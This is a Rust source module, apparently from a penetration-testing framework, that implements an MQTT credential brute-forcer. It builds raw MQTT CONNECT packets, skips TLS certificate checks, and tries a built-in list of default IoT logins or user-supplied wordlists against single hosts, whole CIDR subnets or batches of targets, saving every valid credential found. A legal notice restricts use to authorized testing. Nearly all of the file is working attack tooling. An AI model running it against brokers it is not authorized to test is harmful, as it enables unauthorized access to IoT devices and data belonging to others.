// src/modules/creds/generic/mqtt_bruteforce.rs
// Comprehensive MQTT Security Testing Module
//
// ⚠️ LEGAL NOTICE ⚠️
// This tool is designed for AUTHORIZED security testing ONLY.
// Unauthorized access to computer systems is illegal under:
// - Computer Fraud and Abuse Act (CFAA) - USA
// - Computer Misuse Act - UK
// - Similar laws in other jurisdictions
//
// Only use this tool on systems you own or have explicit written permission to test.

use anyhow::{anyhow, Context, Result};
use colored::*;
use regex::Regex;
use serde::{Deserialize, Serialize};
use std::collections::HashSet;
use std::net::ToSocketAddrs;
use std::path::Path;
use std::sync::{
    atomic::{AtomicBool, AtomicU64, Ordering},
    Arc,
};
use std::time::{Duration, Instant};
use tokio::fs::{File, OpenOptions};
use tokio::io::{AsyncBufReadExt, AsyncWriteExt, BufReader};
use tokio::net::TcpStream;
use tokio::sync::{mpsc, Mutex, Semaphore};
use tokio::time::{sleep, timeout};
use once_cell::sync::Lazy;
use native_tls::TlsConnector;
use chrono;

// ============================================================
// CONSTANTS
// ============================================================

const MAX_MEMORY_SIZE: u64 = 500 * 1024 * 1024;
const CHANNEL_BUFFER_MULTIPLIER: usize = 16;
const PROGRESS_INTERVAL_SECS: u64 = 3;
const DEFAULT_MQTT_PORTS: &[u16] = &[1883, 8883];

const DEFAULT_CREDENTIALS: &[(&str, &str)] = &[
    ("admin", "admin"),
    ("admin", ""),
    ("admin", "12345"),
    ("admin", "123456"),
    ("admin", "password"),
    ("root", "root"),
    ("root", ""),
    ("user", "user"),
    ("guest", "guest"),
    ("mqtt", "mqtt"),
    ("", ""),  // No auth
    ("test", "test"),
    ("iot", "iot"),
    ("device", "device"),
    ("sensor", "sensor"),
];

// ============================================================
// CONFIGURATION STRUCTURES
// ============================================================

#[derive(Clone, Serialize, Deserialize)]
pub struct MqttBruteforceConfig {
    #[serde(skip)]
    pub target: String,
    pub port: u16,
    pub username_wordlist: String,
    pub password_wordlist: Option<String>,
    pub threads: usize,
    pub delay_ms: u64,
    pub connection_timeout: u64,
    pub read_timeout: u64,
    pub stop_on_success: bool,
    pub verbose: bool,
    pub full_combo: bool,
    pub output_file: String,
    pub append_mode: bool,
    pub pre_validate: bool,
    pub retry_on_error: bool,
    pub max_retries: usize,
    pub use_tls: bool,
    pub client_id: String,
    pub keep_alive: u16,
}

#[derive(Clone)]
pub struct BatchScanConfig {
    pub targets: Vec<String>,
    pub ports: Vec<u16>,
    pub credentials: Vec<(String, String)>,
    pub timeout: Duration,
    pub max_concurrent: usize,
    pub output_file: String,
    pub verbose: bool,
    pub use_tls: bool,
}

#[derive(Debug, Clone)]
pub struct ScanResult {
    pub ip: String,
    pub port: u16,
    pub banner: String,
    pub credentials: Option<(String, String)>,
    pub timestamp: String,
}

// ============================================================
// STATISTICS TRACKING
// ============================================================

pub struct Statistics {
    total_attempts: AtomicU64,
    successful_attempts: AtomicU64,
    failed_attempts: AtomicU64,
    error_attempts: AtomicU64,
    retried_attempts: AtomicU64,
    start_time: Instant,
}

impl Statistics {
    #[inline]
    pub fn new() -> Self {
        Self {
            total_attempts: AtomicU64::new(0),
            successful_attempts: AtomicU64::new(0),
            failed_attempts: AtomicU64::new(0),
            error_attempts: AtomicU64::new(0),
            retried_attempts: AtomicU64::new(0),
            start_time: Instant::now(),
        }
    }

    #[inline]
    pub fn record_attempt(&self, success: bool, error: bool) {
        self.total_attempts.fetch_add(1, Ordering::Relaxed);
        if error {
            self.error_attempts.fetch_add(1, Ordering::Relaxed);
        } else if success {
            self.successful_attempts.fetch_add(1, Ordering::Relaxed);
        } else {
            self.failed_attempts.fetch_add(1, Ordering::Relaxed);
        }
    }

    #[inline]
    pub fn record_retry(&self) {
        self.retried_attempts.fetch_add(1, Ordering::Relaxed);
    }

    pub fn print_progress(&self) {
        let total = self.total_attempts.load(Ordering::Relaxed);
        let success = self.successful_attempts.load(Ordering::Relaxed);
        let failed = self.failed_attempts.load(Ordering::Relaxed);
        let errors = self.error_attempts.load(Ordering::Relaxed);
        let retries = self.retried_attempts.load(Ordering::Relaxed);
        let elapsed = self.start_time.elapsed().as_secs_f64();
        let rate = if elapsed > 0.0 { total as f64 / elapsed } else { 0.0 };

        print!(
            "\r{} {} attempts | {} OK | {} fail | {} err | {} retry | {:.1}/s    ",
            "[Progress]".cyan(),
               total.to_string().bold(),
               success.to_string().green(),
               failed,
               errors.to_string().red(),
               retries,
               rate
        );
        let _ = std::io::Write::flush(&mut std::io::stdout());
    }

    pub fn print_final(&self) {
        println!();
        let total = self.total_attempts.load(Ordering::Relaxed);
        let success = self.successful_attempts.load(Ordering::Relaxed);
        let failed = self.failed_attempts.load(Ordering::Relaxed);
        let errors = self.error_attempts.load(Ordering::Relaxed);
        let retries = self.retried_attempts.load(Ordering::Relaxed);
        let elapsed = self.start_time.elapsed().as_secs_f64();
        let rate = if elapsed > 0.0 { total as f64 / elapsed } else { 0.0 };

        println!("\n{}", "[Final Statistics]".bold().cyan());
        println!("  Total attempts:  {}", total.to_string().bold());
        println!("  Successful:      {}", success.to_string().green().bold());
        println!("  Failed:          {}", failed);
        println!("  Errors:          {}", errors.to_string().yellow());
        println!("  Retries:         {}", retries);
        println!("  Time elapsed:    {:.2}s", elapsed);
        println!("  Average rate:    {:.2} attempts/sec", rate);
        if success > 0 {
            let success_rate = (success as f64 / total as f64) * 100.0;
            println!("  Success rate:    {:.2}%", success_rate);
        }
    }
}

// ============================================================
// MAIN ENTRY POINT
// ============================================================

pub async fn run(target: &str) -> Result<()> {
    display_banner();

    println!("Select operation mode:");
    println!("  1. Single Target Bruteforce (advanced)");
    println!("  2. Subnet Bruteforce (CIDR notation)");
    println!("  3. Batch Scanner (multiple targets)");
    println!("  4. Quick Default Check (single target)");
    println!("  5. Subnet Default Check (CIDR)");
    println!();

    let mode = prompt_required("Select mode [1-5]: ");

    match mode.as_str() {
        "1" => run_single_target_bruteforce(target, false).await,
        "2" => run_single_target_bruteforce(target, true).await,
        "3" => run_batch_scanner(target).await,
        "4" => run_quick_check(target, false).await,
        "5" => run_quick_check(target, true).await,
        _ => {
            println!("[!] Invalid selection");
            Ok(())
        }
    }
}

// ============================================================
// MQTT PACKET CONSTRUCTION
// ============================================================

/// Build MQTT CONNECT packet
fn build_mqtt_connect_packet(
    client_id: &str,
    username: Option<&str>,
    password: Option<&str>,
    keep_alive: u16,
) -> Vec<u8> {
    let mut packet = Vec::new();
    
    // Fixed header: Message type (1 = CONNECT), flags (0), remaining length (will be set later)
    packet.push(0x10); // CONNECT message type
    
    // Variable header
    let mut variable_header = Vec::new();
    
    // Protocol name: "MQTT" (4 bytes length + 4 bytes string)
    variable_header.extend_from_slice(&[0x00, 0x04]); // Length
    variable_header.extend_from_slice(b"MQTT");
    
    // Protocol level: 4 (MQTT 3.1.1)
    variable_header.push(0x04);
    
    // Connect flags
    let mut connect_flags = 0u8;
    if username.is_some() {
        connect_flags |= 0x80; // Username flag
    }
    if password.is_some() {
        connect_flags |= 0x40; // Password flag
    }
    connect_flags |= 0x02; // Clean session
    variable_header.push(connect_flags);
    
    // Keep alive (2 bytes, MSB first)
    variable_header.push((keep_alive >> 8) as u8);
    variable_header.push((keep_alive & 0xFF) as u8);
    
    // Payload
    let mut payload = Vec::new();
    
    // Client ID (UTF-8 encoded string with 2-byte length prefix)
    let client_id_bytes = client_id.as_bytes();
    payload.push((client_id_bytes.len() >> 8) as u8);
    payload.push((client_id_bytes.len() & 0xFF) as u8);
    payload.extend_from_slice(client_id_bytes);
    
    // Username (if provided)
    if let Some(user) = username {
        let user_bytes = user.as_bytes();
        payload.push((user_bytes.len() >> 8) as u8);
        payload.push((user_bytes.len() & 0xFF) as u8);
        payload.extend_from_slice(user_bytes);
    }
    
    // Password (if provided)
    if let Some(pass) = password {
        let pass_bytes = pass.as_bytes();
        payload.push((pass_bytes.len() >> 8) as u8);
        payload.push((pass_bytes.len() & 0xFF) as u8);
        payload.extend_from_slice(pass_bytes);
    }
    
    // Calculate remaining length (variable header + payload)
    let remaining_length = variable_header.len() + payload.len();
    let mut remaining_length_bytes = Vec::new();
    let mut x = remaining_length;
    loop {
        let mut byte = (x % 128) as u8;
        x /= 128;
        if x > 0 {
            byte |= 0x80;
        }
        remaining_length_bytes.push(byte);
        if x == 0 {
            break;
        }
    }
    
    // Complete packet: Fixed header + remaining length + variable header + payload
    packet.extend_from_slice(&remaining_length_bytes);
    packet.extend_from_slice(&variable_header);
    packet.extend_from_slice(&payload);
    
    packet
}

/// Parse MQTT CONNACK packet to check return code
fn parse_connack(packet: &[u8]) -> Option<u8> {
    if packet.len() < 4 {
        return None;
    }
    
    // Check if it's a CONNACK (0x20)
    if (packet[0] & 0xF0) != 0x20 {
        return None;
    }
    
    // Return code is the last byte
    // CONNACK structure: [0x20, remaining_length, flags, return_code]
    Some(packet[packet.len() - 1])
}

// Core MQTT login function
async fn try_mqtt_login(
    host: &str,
    username: &str,
    password: &str,
    config: &MqttBruteforceConfig,
) -> Result<bool> {
    let addr = format!("{}:{}", host, config.port);
    let socket = addr.to_socket_addrs()?.next().ok_or_else(|| anyhow!("Cannot resolve"))?;

    let mut stream = timeout(
        Duration::from_secs(config.connection_timeout),
        TcpStream::connect(socket)
    )
    .await
    .context("Connection timeout")?
    .context("Connect failed")?;

    // Build CONNECT packet
    let username_opt = if username.is_empty() { None } else { Some(username) };
    let password_opt = if password.is_empty() { None } else { Some(password) };
    let connect_packet = build_mqtt_connect_packet(&config.client_id, username_opt, password_opt, config.keep_alive);

    // Upgrade to TLS if needed
    if config.use_tls {
        use tokio::task::spawn_blocking;
        use std::io::{Read, Write};
        use std::net::TcpStream as StdTcpStream;
        
        let host_clone = host.to_string();
        let addr_clone = format!("{}:{}", host, config.port);
        let packet_clone = connect_packet.clone();
        let read_timeout = config.read_timeout;
        let conn_timeout = config.connection_timeout;
        
        let result = spawn_blocking(move || -> Result<bool> {
            let connector = TlsConnector::builder()
                .danger_accept_invalid_certs(true)
                .danger_accept_invalid_hostnames(true)
                .build()
                .context("TLS connector build failed")?;

            // Create blocking TCP connection
            let socket = addr_clone.to_socket_addrs()?.next().ok_or_else(|| anyhow!("Cannot resolve"))?;
            let std_stream = StdTcpStream::connect_timeout(&socket, Duration::from_secs(conn_timeout))
                .context("Connection timeout")?;
            
            let mut tls_stream = connector
                .connect(&host_clone, std_stream)
                .context("TLS connection failed")?;
            
            // Write CONNECT packet
            tls_stream.write_all(&packet_clone)?;
            tls_stream.flush()?;
            
            // Read CONNACK with timeout
            tls_stream.get_ref().set_read_timeout(Some(Duration::from_secs(read_timeout)))?;
            let mut buffer = vec![0u8; 4];
            match tls_stream.read(&mut buffer) {
                Ok(n) if n >= 4 => {
                    if let Some(return_code) = parse_connack(&buffer[..n]) {
                        return Ok(return_code == 0); // 0 = success
                    }
                }
                _ => {}
            }
            
            Ok(false)
        }).await?;
        
        return result;
    } else {
        // Plain TCP connection
        use tokio::io::{AsyncReadExt, AsyncWriteExt};
        
        // Write packet
        stream.write_all(&connect_packet).await?;
        stream.flush().await?;
        
        // Read CONNACK
        let mut buffer = vec![0u8; 4];
        match timeout(Duration::from_secs(config.read_timeout), stream.read(&mut buffer)).await {
            Ok(Ok(n)) if n >= 4 => {
                if let Some(return_code) = parse_connack(&buffer[..n]) {
                    return Ok(return_code == 0); // 0 = success
                }
            }
            _ => {}
        }
    }

    Ok(false)
}

async fn try_mqtt_login_simple(
    ip: &str,
    port: u16,
    username: &str,
    password: &str,
    use_tls: bool,
    timeout_secs: u64,
) -> Result<bool> {
    let addr = format!("{}:{}", ip, port);
    let socket = addr.to_socket_addrs()?.next().ok_or_else(|| anyhow!("Cannot resolve"))?;

    let stream = timeout(
        Duration::from_secs(timeout_secs),
        TcpStream::connect(socket)
    )
    .await??;

    let connect_packet = build_mqtt_connect_packet(
        "mqtt_scanner",
        if username.is_empty() { None } else { Some(username) },
        if password.is_empty() { None } else { Some(password) },
        60,
    );

    if use_tls {
        use tokio::task::spawn_blocking;
        use std::io::{Read, Write};
        use std::net::TcpStream as StdTcpStream;
        
        let ip_clone = ip.to_string();
        let addr_clone = format!("{}:{}", ip, port);
        let packet_clone = connect_packet.clone();
        let timeout_secs_clone = timeout_secs;
        
        let result = spawn_blocking(move || -> Result<bool> {
            let connector = TlsConnector::builder()
                .danger_accept_invalid_certs(true)
                .danger_accept_invalid_hostnames(true)
                .build()?;

            let socket = addr_clone.to_socket_addrs()?.next().ok_or_else(|| anyhow!("Cannot resolve"))?;
            let std_stream = StdTcpStream::connect_timeout(&socket, Duration::from_secs(timeout_secs_clone))?;
            let mut tls_stream = connector.connect(&ip_clone, std_stream)?;
            tls_stream.write_all(&packet_clone)?;
            tls_stream.flush()?;

            tls_stream.get_ref().set_read_timeout(Some(Duration::from_secs(timeout_secs_clone)))?;
            let mut buffer = vec![0u8; 4];
            match tls_stream.read(&mut buffer) {
                Ok(n) if n >= 4 => {
                    if let Some(return_code) = parse_connack(&buffer[..n]) {
                        return Ok(return_code == 0);
                    }
                }
                _ => {}
            }
            Ok(false)
        }).await?;
        
        return result;
    } else {
        use tokio::io::{AsyncReadExt, AsyncWriteExt};
        let mut stream = stream;
        stream.write_all(&connect_packet).await?;
        stream.flush().await?;

        let mut buffer = vec![0u8; 4];
        match timeout(Duration::from_secs(timeout_secs), stream.read(&mut buffer)).await {
            Ok(Ok(n)) if n >= 4 => {
                if let Some(return_code) = parse_connack(&buffer[..n]) {
                    return Ok(return_code == 0);
                }
            }
            _ => {}
        }
    }

    Ok(false)
}

// ============================================================
// MODE 1 & 2: SINGLE TARGET / SUBNET BRUTEFORCE
// ============================================================

async fn run_single_target_bruteforce(target: &str, is_subnet: bool) -> Result<()> {
    println!("\n{}", if is_subnet {
        "=== Subnet Bruteforce Mode ==="
    } else {
        "=== Single Target Bruteforce Mode ==="
    }.bold().cyan());
    println!();

    let targets = parse_single_target(target)?;

    if targets.len() > 1 {
        println!("[*] Expanded to {} hosts", targets.len());
        if !prompt_yes_no("Continue with all hosts? (y/n): ", true) {
            return Ok(());
        }
    }

    let target_primary = targets[0].clone();
    let use_config = prompt_yes_no("Do you have a configuration file? (y/n): ", false);

    let config = if use_config {
        println!();
        print_config_format();
        println!();

        let config_path = prompt_wordlist("Path to configuration file: ")?;

        println!("[*] Loading configuration from '{}'...", config_path);
        match load_and_validate_config(&config_path, &target_primary).await {
            Ok(cfg) => {
                println!("{}", "[+] Configuration loaded and validated!".green().bold());
                cfg
            }
            Err(e) => {
                eprintln!("{}", "[!] Configuration validation failed:".red().bold());
                eprintln!("    {}", e.to_string().yellow());
                return Err(e);
            }
        }
    } else {
        build_interactive_config(&target_primary).await?
    };

    print_config_summary(&config);

    if !prompt_yes_no("\nProceed with this configuration? (y/n): ", true) {
        println!("[*] Aborted by user.");
        return Ok(());
    }

    if !use_config && prompt_yes_no("\nSave this configuration? (y/n): ", false) {
        let save_path = prompt_required("Configuration file path: ");
        if let Err(e) = save_config(&config, &save_path).await {
            eprintln!("[!] Failed to save config: {}", e);
        } else {
            println!("[+] Configuration saved to '{}'", save_path);
        }
    }

    println!();
    println!("{}", "[Starting Attack]".bold().yellow());
    println!();

    if targets.len() > 1 {
        let parallel = prompt_yes_no("Run targets in parallel? (y/n): ", false);
        if parallel {
            run_parallel_bruteforce(targets, config).await
        } else {
            run_sequential_bruteforce(targets, config).await
        }
    } else {
        run_mqtt_bruteforce(config).await
    }
}

async fn run_sequential_bruteforce(targets: Vec<String>, base_config: MqttBruteforceConfig) -> Result<()> {
    for (idx, target) in targets.iter().enumerate() {
        println!("\n{}", format!("=== Target {}/{}: {} ===", idx + 1, targets.len(), target).bright_cyan());
        let mut config = base_config.clone();
        config.target = target.clone();

        if let Err(e) = run_mqtt_bruteforce(config).await {
            eprintln!("[!] Error with target {}: {}", target, e);
        }

        if idx < targets.len() - 1 {
            sleep(Duration::from_secs(1)).await;
        }
    }
    Ok(())
}

async fn run_parallel_bruteforce(targets: Vec<String>, base_config: MqttBruteforceConfig) -> Result<()> {
    let max_concurrent = prompt_threads(5);
    let semaphore = Arc::new(Semaphore::new(max_concurrent));
    let mut tasks = Vec::new();

    for target in targets {
        let sem = semaphore.clone();
        let config = base_config.clone();

        let task = tokio::spawn(async move {
            let _permit = sem.acquire().await.unwrap();
            let mut target_config = config;
            target_config.target = target.clone();
            run_mqtt_bruteforce(target_config).await
        });

        tasks.push(task);
    }

    for task in tasks {
        if let Err(e) = task.await {
            eprintln!("[!] Task error: {}", e);
        }
    }

    Ok(())
}

// ============================================================
// MODE 3: BATCH SCANNER
// ============================================================

async fn run_batch_scanner(target: &str) -> Result<()> {
    println!("\n{}", "=== Batch Scanner Mode ===".bold().cyan());
    println!();

    let mut config = BatchScanConfig {
        targets: Vec::new(),
        ports: DEFAULT_MQTT_PORTS.to_vec(),
        credentials: DEFAULT_CREDENTIALS
            .iter()
            .map(|(u, p)| (u.to_string(), p.to_string()))
            .collect(),
        timeout: Duration::from_secs(3),
        max_concurrent: 50,
        output_file: "mqtt_scan_results.txt".to_string(),
        verbose: false,
        use_tls: false,
    };

    if Path::new(target).exists() {
        let content = tokio::fs::read_to_string(target).await?;
        config.targets = parse_targets(&content)?;
    } else {
        config.targets = parse_targets(target)?;
    }

    if config.targets.is_empty() {
        return Err(anyhow!("No valid targets specified"));
    }

    println!("Loaded {} target(s)", config.targets.len());

    if prompt_yes_no("Use default ports (1883, 8883)? (y/n): ", true) {
        config.ports = DEFAULT_MQTT_PORTS.to_vec();
    } else {
        let ports_str = prompt_required("Enter ports (comma-separated): ");
        config.ports = ports_str
            .split(',')
            .filter_map(|s| s.trim().parse().ok())
            .collect();
    }

    if prompt_yes_no("Use default credential list? (y/n): ", true) {
        config.credentials = DEFAULT_CREDENTIALS
            .iter()
            .map(|(u, p)| (u.to_string(), p.to_string()))
            .collect();
    } else {
        let cred_file = prompt_wordlist("Path to credentials file (user:pass format): ")?;
        config.credentials = load_credentials_file(&cred_file).await?;
    }

    config.max_concurrent = prompt_threads(50);
    config.verbose = prompt_yes_no("Verbose output? (y/n): ", false);
    config.output_file = prompt_required("Output file: ");

    println!();
    println!("Configuration:");
    println!("  Targets:      {}", config.targets.len());
    println!("  Ports:        {:?}", config.ports);
    println!("  Credentials:  {}", config.credentials.len());
    println!("  Concurrency:  {}", config.max_concurrent);
    println!();

    if !prompt_yes_no("Start scan? (y/n): ", true) {
        println!("Scan cancelled");
        return Ok(());
    }

    println!();
    execute_batch_scan(config).await
}

// ============================================================
// MODE 4 & 5: QUICK DEFAULT CHECK
// ============================================================

async fn run_quick_check(target: &str, is_subnet: bool) -> Result<()> {
    println!("\n{}", if is_subnet {
        "=== Subnet Quick Default Check ==="
    } else {
        "=== Quick Default Credential Check ==="
    }.bold().cyan());
    println!();

    let targets = if is_subnet {
        parse_single_target(target)?
    } else if Path::new(target).exists() {
        let content = tokio::fs::read_to_string(target).await?;
        parse_targets(&content)?
    } else {
        vec![target.to_string()]
    };

    let port: u16 = prompt_required("Port (default 1883): ")
        .parse()
        .unwrap_or(1883);

    println!();
    println!("Testing {} target(s) on port {} with {} default credentials...",
             targets.len(), port, DEFAULT_CREDENTIALS.len());
    println!();

    let mut found_any = false;
    let mut results = Vec::new();

    for target_ip in targets {
        println!("[*] Testing {}:{}", target_ip, port);

        for (username, password) in DEFAULT_CREDENTIALS {
            let use_tls = port == 8883;
            match try_mqtt_login_simple(&target_ip, port, username, password, use_tls, 3).await {
                Ok(true) => {
                    let result = format!("{}:{} - {}/{}",
                                         target_ip, port, username,
                                         if password.is_empty() { "(blank)" } else { password });

                    println!(
                        "  {} Valid: {}/{}",
                        "✓".bright_green().bold(),
                             username,
                             if password.is_empty() { "(blank)" } else { password }
                    );
                    results.push(result);
                    found_any = true;
                }
                Ok(false) => {}
                Err(e) => {
                    println!("  {} Error: {}", "!".yellow(), e);
                    break;
                }
            }
            sleep(Duration::from_millis(200)).await;
        }
        println!();
    }

    if !found_any {
        println!("{}", "[-] No valid credentials found".yellow());
    } else if prompt_yes_no("Save results to file? (y/n): ", true) {
        let output_path = prompt_required("Output file path: ");
        save_quick_check_results(&output_path, &results).await?;
        println!("[+] Results saved to '{}'", output_path);
    }

    Ok(())
}

async fn save_quick_check_results(path: &str, results: &[String]) -> Result<()> {
    let mut f = File::create(path).await?;
    f.write_all(b"# Quick Check Results\n").await?;
    f.write_all(format!("# Date: {}\n\n", chrono::Local::now()).as_bytes()).await?;
    for result in results {
        f.write_all(format!("{}\n", result).as_bytes()).await?;
    }
    f.flush().await?;
    Ok(())
}

// ============================================================
// BRUTEFORCE EXECUTION
// ============================================================

async fn run_mqtt_bruteforce(config: MqttBruteforceConfig) -> Result<()> {
    let addr = normalize_target(&config.target, config.port)?;
    let socket_addr = addr.to_socket_addrs()?.next().context("Unable to resolve target")?;
    let host = socket_addr.ip().to_string();

    println!("[*] Target resolved to: {}", socket_addr);

    if config.pre_validate {
        println!("[*] Validating target is MQTT broker...");
        match validate_mqtt_target(&host, &config).await {
            Ok(_) => println!("{}", "[+] Target validation successful".green()),
            Err(e) => {
                eprintln!("{}", format!("[!] Warning: {}", e).yellow());
                if !prompt_yes_no("Continue anyway? (y/n): ", false) {
                    return Err(anyhow!("Target validation failed"));
                }
            }
        }
    }

    let username_size = tokio::fs::metadata(&config.username_wordlist).await?.len();
    let password_size = if let Some(ref path) = config.password_wordlist {
        tokio::fs::metadata(path).await?.len()
    } else {
        0
    };

    let total_size = username_size + password_size;
    let use_streaming = should_use_streaming(total_size);

    let (usernames, passwords, username_count, password_count) = if use_streaming {
        load_wordlists_streaming(&config).await?
    } else {
        load_wordlists_memory(&config).await?
    };

    println!("[*] Loaded {} username(s)", username_count);
    if password_count > 0 {
        println!("[*] Loaded {} password(s)", password_count);
    }

    let estimated_total = calculate_estimated_attempts(&config, username_count, password_count);
    println!("[*] Estimated total attempts: {}", estimated_total);
    println!();

    let output_file = Arc::new(config.output_file.clone());
    initialize_output_file(&output_file, &config).await?;

    let found_creds = Arc::new(Mutex::new(HashSet::new()));
    let stop_flag = Arc::new(AtomicBool::new(false));
    let stats = Arc::new(Statistics::new());

    let channel_buffer = config.threads * CHANNEL_BUFFER_MULTIPLIER;
    let (tx, rx) = mpsc::channel::<(Arc<str>, Arc<str>)>(channel_buffer);

    spawn_producers(
        &config,
        tx,
        use_streaming,
        &usernames,
        &passwords,
        username_count,
        password_count,
        stop_flag.clone(),
    );

    let semaphore = Arc::new(Semaphore::new(config.threads));
    let rx = Arc::new(Mutex::new(rx));
    let mut worker_handles = Vec::with_capacity(config.threads);

    for worker_id in 0..config.threads {
        let h = spawn_worker(
            worker_id,
            rx.clone(),
            host.clone(),
            stop_flag.clone(),
            found_creds.clone(),
            output_file.clone(),
            config.clone(),
            stats.clone(),
            semaphore.clone(),
        );
        worker_handles.push(h);
    }

    let progress_handle = spawn_progress_reporter(stats.clone(), stop_flag.clone());

    for h in worker_handles {
        let _ = h.await;
    }

    stop_flag.store(true, Ordering::Relaxed);
    let _ = progress_handle.await;

    stats.print_final();
    print_final_report(&found_creds, &output_file).await;

    Ok(())
}

// ============================================================
// WORKER AND PRODUCER FUNCTIONS
// ============================================================
// Note: The core MQTT login functions are already defined above

fn spawn_worker(
    worker_id: usize,
    rx: Arc<Mutex<mpsc::Receiver<(Arc<str>, Arc<str>)>>>,
    host: String,
    stop_flag: Arc<AtomicBool>,
    found_creds: Arc<Mutex<HashSet<(String, String)>>>,
    output_file: Arc<String>,
    config: MqttBruteforceConfig,
    stats: Arc<Statistics>,
    semaphore: Arc<Semaphore>,
) -> tokio::task::JoinHandle<()> {
    tokio::spawn(async move {
        loop {
            if stop_flag.load(Ordering::SeqCst) {
                if config.verbose {
                    println!("[*] Worker {} stopping (stop flag set)", worker_id);
                }
                break;
            }

            let pair = {
                let mut guard = rx.lock().await;

                match guard.try_recv() {
                    Ok(p) => Some(p),
                    Err(mpsc::error::TryRecvError::Empty) => {
                        drop(guard);

                        if stop_flag.load(Ordering::SeqCst) {
                            break;
                        }

                        sleep(Duration::from_millis(10)).await;
                        continue;
                    }
                    Err(mpsc::error::TryRecvError::Disconnected) => None,
                }
            };

            let Some((user, pass)) = pair else {
                if config.verbose {
                    println!("[*] Worker {} stopping (channel closed)", worker_id);
                }
                break;
            };

            if stop_flag.load(Ordering::SeqCst) {
                if config.verbose {
                    println!("[*] Worker {} dropping work {}:{} (stopped)", worker_id, user, pass);
                }
                break;
            }

            let _permit = semaphore.acquire().await.unwrap();

            if stop_flag.load(Ordering::SeqCst) {
                if config.verbose {
                    println!("[*] Worker {} aborting attempt {}:{} (stopped)", worker_id, user, pass);
                }
                break;
            }

            if config.verbose {
                println!("{} [Worker {}] Trying {}:{}", "[*]".bright_blue(), worker_id, user, &pass);
            }

            let mut attempt_result = try_mqtt_login(&host, &user, &pass, &config).await;

            let mut retry_count = 0;
            while config.retry_on_error && retry_count < config.max_retries && attempt_result.is_err() {
                if stop_flag.load(Ordering::SeqCst) {
                    break;
                }

                retry_count += 1;
                stats.record_retry();
                sleep(Duration::from_millis(config.delay_ms * 2)).await;
                attempt_result = try_mqtt_login(&host, &user, &pass, &config).await;
            }

            match attempt_result {
                Ok(true) => {
                    stats.record_attempt(true, false);

                    let mut creds = found_creds.lock().await;
                    if creds.insert((user.to_string(), pass.to_string())) {
                        drop(creds);

                        println!("\n{}", format!("[+] VALID: {}:{}", user, pass).green().bold());

                        if let Err(e) = append_result(&output_file, &user, &pass).await {
                            eprintln!("[!] Failed to write result: {}", e);
                        }

                        if config.stop_on_success {
                            stop_flag.store(true, Ordering::SeqCst);

                            let mut rx_guard = rx.lock().await;
                            let mut drained = 0;
                            while rx_guard.try_recv().is_ok() {
                                drained += 1;
                            }
                            drop(rx_guard);

                            if config.verbose && drained > 0 {
                                println!("[*] Worker {} drained {} queued attempts", worker_id, drained);
                            }

                            println!("[*] Worker {} stopping (success, stop_on_success=true)", worker_id);
                            break;
                        }
                    }
                }
                Ok(false) => {
                    stats.record_attempt(false, false);
                    if config.verbose {
                        println!("{} Failed: {}:{}", "[-]".red(), user, pass);
                    }
                }
                Err(e) => {
                    stats.record_attempt(false, true);
                    if config.verbose {
                        eprintln!("{} Error ({}): {}:{}", "[!]".yellow(), e, user, pass);
                    }
                }
            }

            if config.delay_ms > 0 {
                sleep(Duration::from_millis(config.delay_ms)).await;
            }
        }
    })
}

fn spawn_progress_reporter(
    stats: Arc<Statistics>,
    stop_flag: Arc<AtomicBool>,
) -> tokio::task::JoinHandle<()> {
    tokio::spawn(async move {
        let mut interval = tokio::time::interval(Duration::from_secs(PROGRESS_INTERVAL_SECS));
        loop {
            interval.tick().await;
            if stop_flag.load(Ordering::Relaxed) {
                break;
            }
            stats.print_progress();
        }
    })
}

fn spawn_producers(
    config: &MqttBruteforceConfig,
    tx: mpsc::Sender<(Arc<str>, Arc<str>)>,
    use_streaming: bool,
    usernames: &[String],
    passwords: &[String],
    username_count: usize,
    password_count: usize,
    stop_flag: Arc<AtomicBool>,
) {
    if use_streaming {
        spawn_streaming_producers(config, tx.clone(), username_count, password_count, stop_flag.clone());
    } else {
        spawn_memory_producers(config, tx.clone(), usernames, passwords, stop_flag.clone());
    }
    drop(tx);
}

fn spawn_streaming_producers(
    config: &MqttBruteforceConfig,
    tx: mpsc::Sender<(Arc<str>, Arc<str>)>,
    username_count: usize,
    password_count: usize,
    stop_flag: Arc<AtomicBool>,
) {
    if password_count > 0 {
        let password_path = config.password_wordlist.clone().unwrap();
        let username_path = config.username_wordlist.clone();
        let full_combo = config.full_combo;
        let tx_clone = tx.clone();
        let stop_clone = stop_flag.clone();
        tokio::spawn(async move {
            if let Err(e) = enqueue_wordlist_combos_streaming(
                tx_clone, &username_path, &password_path, full_combo,
                stop_clone, username_count, password_count,
            ).await {
                eprintln!("[!] Wordlist producer error: {}", e);
            }
        });
    }
}

fn spawn_memory_producers(
    config: &MqttBruteforceConfig,
    tx: mpsc::Sender<(Arc<str>, Arc<str>)>,
    usernames: &[String],
    passwords: &[String],
    stop_flag: Arc<AtomicBool>,
) {
    let usernames_arc: Vec<Arc<str>> = usernames.iter().map(|s| Arc::from(s.as_str())).collect();
    let passwords_arc: Vec<Arc<str>> = passwords.iter().map(|s| Arc::from(s.as_str())).collect();

    if !passwords_arc.is_empty() {
        let passwords_clone = passwords_arc.clone();
        let usernames_clone = usernames_arc.clone();
        let full_combo = config.full_combo;
        let tx_clone = tx.clone();
        let stop_clone = stop_flag.clone();
        tokio::spawn(async move {
            if let Err(e) = enqueue_wordlist_combos_fast(
                tx_clone, &usernames_clone, &passwords_clone, full_combo, stop_clone,
            ).await {
                eprintln!("[!] Wordlist producer error: {}", e);
            }
        });
    }
}

#[inline]
async fn enqueue_wordlist_combos_fast(
    tx: mpsc::Sender<(Arc<str>, Arc<str>)>,
    usernames: &[Arc<str>],
    passwords: &[Arc<str>],
    full_combo: bool,
    stop_flag: Arc<AtomicBool>,
) -> Result<()> {
    if passwords.is_empty() {
        return Ok(());
    }

    if full_combo {
        for user in usernames {
            if stop_flag.load(Ordering::Relaxed) { break; }
            for pass in passwords {
                if stop_flag.load(Ordering::Relaxed) { break; }
                tx.send((user.clone(), pass.clone())).await.ok();
            }
        }
    } else if usernames.len() == 1 {
        let user = &usernames[0];
        for pass in passwords {
            if stop_flag.load(Ordering::Relaxed) { break; }
            tx.send((user.clone(), pass.clone())).await.ok();
        }
    } else if passwords.len() == 1 {
        let pass = &passwords[0];
        for user in usernames {
            if stop_flag.load(Ordering::Relaxed) { break; }
            tx.send((user.clone(), pass.clone())).await.ok();
        }
    } else {
        let user = &usernames[0];
        for pass in passwords {
            if stop_flag.load(Ordering::Relaxed) { break; }
            tx.send((user.clone(), pass.clone())).await.ok();
        }
    }

    Ok(())
}

